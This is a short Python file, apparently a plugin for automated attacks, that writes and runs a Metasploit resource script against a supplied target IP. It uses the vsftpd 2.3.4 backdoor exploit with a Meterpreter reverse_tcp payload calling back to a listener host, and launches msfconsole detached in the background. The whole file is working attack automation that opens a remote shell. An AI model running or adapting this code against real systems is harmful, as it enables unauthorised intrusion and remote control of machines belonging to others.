import os
import time
import subprocess
from pathlib import Path

def run_msf_attack(target_ip, log_dir="logs/metasploit", payload="linux/x86/meterpreter/reverse_tcp", lhost="10.0.0.100", lport="4444"):
    """
    Dynamically creates and executes a Metasploit .rc script for attacking a target IP.
    """
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")

    # Example using vsftpd 2.3.4
    with open(script_path, "w") as f:
        f.write(f"use exploit/unix/ftp/vsftpd_234_backdoor\n")
        f.write(f"set RHOST {target_ip}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write("exploit -j\n")

    # Launch Metasploit in background
    subprocess.Popen(
        ["nohup", "msfconsole", "-r", script_path],
        stdout=open(log_path, "w"),
        stderr=subprocess.STDOUT,
        preexec_fn=os.setpgrp
    )

    print(f"[metasploit_plugin] Launched exploit against {target_ip} → log: {log_path}")
    return {
        "script": script_path,
        "log": log_path,
        "timestamp": timestamp
    }
